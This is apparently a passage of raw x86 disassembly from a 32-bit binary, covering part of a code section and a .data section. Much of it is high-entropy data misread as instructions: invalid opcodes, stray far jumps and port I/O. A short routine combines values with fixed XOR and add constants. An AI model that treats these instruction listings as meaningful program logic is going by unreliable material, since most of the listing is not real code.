  411ba7:	(bad)
  411bab:	mov    ebx,0x130a0e5a
  411bb0:	or     BYTE PTR [edx],bl
  411bb2:	inc    ebx
  411bb3:	dec    ebx
  411bb4:	xchg   ebp,eax
  411bb5:	(bad)  
  411bb6:	mov    al,ds:0xdd011586
  411bbb:	jo     0x411bf2
  411bbd:	push   ecx
  411bbe:	stc    
  411bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc0:	pop    esi
  411bc1:	or     dl,cl
  411bc3:	shr    eax,1
  411bc5:	mov    al,ds:0x9b6869d7
  411bca:	in     al,0x58
  411bcc:	pop    ebx
  411bcd:	inc    esp
  411bce:	sub    BYTE PTR ds:[eax-0x629fbb1f],0xbb
  411bd6:	cli    
  411bd7:	push   esp
  411bd8:	retf   0xc169
  411bdb:	not    DWORD PTR cs:[ebx]
  411bde:	mov    ecx,0xedfad299
  411be3:	xchg   esi,edi
  411be5:	push   ecx
  411be6:	sbb    ah,dh
  411be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411be9:	loope  0x411bbd
  411beb:	nop
  411bec:	sbb    dh,bh
  411bee:	mov    eax,0x8ac54dbd
  411bf3:	mov    ecx,0x89d6d297
  411bf8:	(bad)  [edx+0x5593daeb]
  411bfe:	pop    esp
  411bff:	push   cs
  411c00:	inc    eax
  411c01:	push   esi
  411c02:	sbb    BYTE PTR [ebp+0x1e3025a2],0x72
  411c09:	out    0xb0,al
  411c0b:	adc    dh,BYTE PTR [eax-0x69661c25]
  411c11:	imul   ebx,DWORD PTR [esi+ebx*8],0x55
  411c15:	xchg   ebp,eax
  411c16:	adc    eax,0x6a09708b
  411c1b:	push   ecx
  411c1c:	add    DWORD PTR [eax+0x16],edi
  411c1f:	and    esi,edx
  411c21:	jnp    0x411c3d
  411c23:	or     eax,0xaccc8382
  411c28:	sub    ah,BYTE PTR [esi]
  411c2a:	mov    ecx,0xcc79ab9b
  411c2f:	dec    edx
  411c30:	cmp    BYTE PTR [eax+0x5e184cfd],cl
  411c36:	ds inc ebx
  411c38:	mov    esi,0x33c70a0c
  411c3d:	ret    0x8b56
  411c40:	jne    0x411c4a
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x4edad6c4
  411c5b:	inc    edi
  411c5c:	xor    al,al
  411c5e:	(bad)  
  411c5f:	dec    ebx
  411c60:	jle    0x411ce0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	sub    DWORD PTR [esi-0x71],0xd39aa61a
  411c6d:	arpl   sp,di
  411c6f:	imul   ebp,ecx,0x11
  411c72:	xor    al,0xda
  411c74:	shl    BYTE PTR [esp+eax*2-0x28901797],cl
  411c7b:	pop    ebp
  411c7c:	aam    0xee
  411c7e:	ins    DWORD PTR es:[edi],dx
  411c7f:	jbe    0x411c3a
  411c81:	es pop ecx
  411c83:	xchg   esi,eax
  411c84:	loope  0x411cd1
  411c86:	daa    
  411c87:	(bad)  
  411c88:	pop    esp
  411c89:	pop    ebp
  411c8a:	adc    edx,DWORD PTR [edx-0x60]
  411c8d:	xchg   esp,eax
  411c8e:	inc    ebx
  411c8f:	aad    0x7a
  411c91:	and    eax,0x875ef529
  411c96:	data16 add ah,bh
  411c99:	ins    DWORD PTR es:[edi],dx
  411c9a:	popa   
  411c9b:	lahf   
  411c9c:	out    0x5b,al
  411c9e:	in     eax,dx
  411c9f:	rol    esi,1
  411ca1:	cmc    
  411ca2:	xchg   al,al
  411ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ca5:	loopne 0x411c6c
  411ca7:	dec    DWORD PTR [esi-0x537c13d1]
  411cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cae:	jmp    0xc610:0x9b68cfb6
  411cb5:	jle    0x411c88
  411cb7:	sub    al,0x2a
  411cb9:	mov    ecx,0x7f68141c
  411cbe:	icebp  
  411cbf:	in     eax,0xcf
  411cc1:	xor    esi,DWORD PTR [edx+0x3bb336e4]
  411cc7:	sbb    DWORD PTR [edi+0x18a369ab],0xffffffe9
  411cce:	push   ss
  411ccf:	xchg   edx,eax
  411cd0:	adc    al,0x91
  411cd2:	sub    al,0x88
  411cd4:	into   
  411cd5:	cli    
  411cd6:	call   edi
  411cd8:	(bad)  
  411cd9:	mov    ds:0x6508ac0d,eax
  411cde:	je     0x411cf9
  411ce0:	cmp    BYTE PTR ds:0x5f31ee71,dh
  411ce6:	push   cs
  411ce7:	mov    ebp,0x1b24963
  411cec:	lock mov WORD PTR [ecx],gs
  411cef:	or     esi,DWORD PTR [esi-0x45]
  411cf2:	(bad)  
  411cf3:	push   eax
  411cf4:	mov    ch,0xd4
  411cf6:	(bad)  
  411cf7:	fdivr  st,st(3)
  411cf9:	inc    esp
  411cfa:	pop    esp
  411cfb:	push   cs
  411cfc:	out    dx,al
  411cfd:	js     0x411cca
  411cff:	xor    al,al
  411d01:	sbb    BYTE PTR [ebx+0x6b4123c5],cl
  411d07:	cs push eax
  411d09:	stos   DWORD PTR es:[edi],eax
  411d0a:	inc    ebp
  411d0b:	xor    BYTE PTR [edx-0x674b8f6a],dh
  411d11:	jae    0x411cc7
  411d13:	cmp    eax,DWORD PTR [eax]
  411d15:	sbb    al,0xcd
  411d17:	lods   al,BYTE PTR ds:[esi]
  411d18:	mov    ?,WORD PTR [edx]
  411d1a:	fisttp WORD PTR [ecx+0x36cdd027]
  411d20:	loope  0x411ceb
  411d22:	add    ebx,ebx
  411d24:	inc    esi
  411d25:	jmp    0x584a284e
  411d2a:	xchg   ebx,eax
  411d2b:	jmp    0x1b8644a9
  411d30:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  411d32:	test   eax,0xe4a9a4f4
  411d37:	outs   dx,BYTE PTR ds:[esi]
  411d38:	add    DWORD PTR [ebx],esp
  411d3a:	cld    
  411d3b:	push   ss
  411d3c:	mov    esp,0x9e4874b4
  411d41:	idiv   BYTE PTR [ebp+0x7e882e67]
  411d47:	mov    ebx,0x999b4d1c
  411d4c:	mov    al,ds:0x7570a94a
  411d51:	pop    edx
  411d52:	xchg   esp,eax
  411d53:	dec    ebx
  411d54:	je     0x411dcc
  411d56:	dec    ebp
  411d57:	lds    esp,FWORD PTR [eax+0x1c]
  411d5a:	fs xchg edx,eax
  411d5c:	cmp    al,0xe3
  411d5e:	jp     0x411d35
  411d60:	and    eax,0x4386f7ef
  411d65:	adc    esp,DWORD PTR [ecx+ecx*1-0x5dab402a]
  411d6c:	stos   BYTE PTR es:[edi],al
  411d6d:	and    al,0xe2
  411d6f:	enter  0x4e88,0x7f
  411d73:	fidiv  WORD PTR [ebx+ecx*4+0x4bfd9b50]
  411d7a:	and    BYTE PTR [ecx+0x6c],al
  411d7d:	mov    dl,0xcb
  411d7f:	jmp    0x411dec
  411d81:	cwde   
  411d82:	inc    ebx
  411d83:	loopne 0x411dc2
  411d85:	xchg   edi,eax
  411d86:	xchg   esi,eax
  411d87:	cmc    
  411d88:	xchg   edx,eax
  411d89:	inc    eax
  411d8a:	push   es
  411d8b:	sbb    eax,0xf36c51a8
  411d90:	outs   dx,BYTE PTR ds:[esi]
  411d91:	sub    DWORD PTR [ecx-0x31313b06],esp
  411d97:	mov    DWORD PTR [eax],0x395fb6a1
  411d9d:	std    
  411d9e:	jnp    0x411df7
  411da0:	fstp   QWORD PTR [ecx+0x275fe5ae]
  411da6:	fwait
  411da7:	aad    0x3e
  411da9:	repnz test al,0x44
  411dac:	stc    
  411dad:	repz in al,dx
  411daf:	aam    0x60
  411db1:	or     eax,0xa93a3b6a
  411db6:	ret    0x980f
  411db9:	pop    ecx
  411dba:	outs   dx,BYTE PTR ds:[esi]
  411dbb:	outs   dx,BYTE PTR ds:[esi]
  411dbc:	dec    esp
  411dbd:	sbb    BYTE PTR [eax+0x19e10f91],cl
  411dc3:	bound  ebx,QWORD PTR [edi+0xe]
  411dc6:	mov    edx,0x94298c59
  411dcb:	mov    bl,0x5e
  411dcd:	(bad)  
  411dce:	mov    ds:0x9dba03d5,al
  411dd3:	shl    BYTE PTR [edx+0x32],1
  411dd6:	outs   dx,BYTE PTR ds:[esi]
  411dd7:	and    BYTE PTR [ebp-0x6b],bh
  411dda:	lods   eax,DWORD PTR ds:[esi]
  411ddb:	dec    edi
  411ddc:	icebp  
  411ddd:	movups xmm5,XMMWORD PTR [eiz*1+0x89daa55]
  411de5:	pop    esp
  411de6:	pushf  
  411de7:	jmp    0xa9b1:0xe33b482
  411dee:	call   0x688d584c
  411df3:	arpl   WORD PTR [esi+0xce7093c],si
  411df9:	sbb    BYTE PTR [esi+eiz*4-0x7],bh
  411dfd:	jns    0x411da6
  411dff:	(bad)  
  411e00:	cli    
  411e01:	(bad)  
  411e03:	add    eax,0xf7578748
  411e08:	dec    esi
  411e09:	ret    
  411e0a:	adc    al,0x45
  411e0c:	jle    0x782bfdba
  411e12:	lahf   
  411e13:	push   eax
  411e14:	mov    edi,0x623d6ef6
  411e19:	xchg   ebp,eax
  411e1a:	push   0x8a70e052
  411e1f:	sti    
  411e20:	cmc    
  411e21:	shl    DWORD PTR [ecx],cl
  411e23:	fst    DWORD PTR [ebp-0x42339642]
  411e29:	or     al,0x85
  411e2b:	clc    
  411e2c:	and    edx,DWORD PTR [esi+0x3c]
  411e2f:	sub    al,BYTE PTR [ebx+0x6223e961]
  411e35:	xor    esi,ecx
  411e37:	push   es
  411e38:	mov    ah,0x3b
  411e3a:	out    dx,eax
  411e3b:	jl     0x411eb3
  411e3d:	test   al,0x78
  411e3f:	mov    ebx,0x17797b11
  411e44:	and    DWORD PTR [eax],ecx
  411e46:	outs   dx,BYTE PTR ds:[esi]
  411e47:	xor    BYTE PTR [eax-0x5a5e0cc7],dh
  411e4d:	cs jnp 0x411ec2
  411e50:	pop    ebx
  411e51:	mov    cl,0xec
  411e53:	or     BYTE PTR [eax],bl
  411e55:	push   ss
  411e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e57:	mov    WORD PTR [eax+0x77],es
  411e5a:	mov    esi,0xc70d8bd6
  411e5f:	mov    cs,WORD PTR [eax+0x3a78bf18]
  411e65:	jbe    0x411df3
  411e67:	sbb    ebx,DWORD PTR [eax+eiz*2-0x588a90ad]
  411e6e:	inc    eax
  411e6f:	add    ebp,DWORD PTR [ecx+0x66]
  411e72:	pop    ds
  411e73:	imul   esi,edi,0x3927a4ac
  411e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e7a:	push   eax
  411e7b:	add    al,BYTE PTR [esi+ecx*1]
  411e7e:	jbe    0x411e85
  411e80:	outs   dx,DWORD PTR ds:[esi]
  411e81:	loop   0x411e97
  411e83:	sar    DWORD PTR [ecx],1
  411e85:	inc    esi
  411e86:	push   esp
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
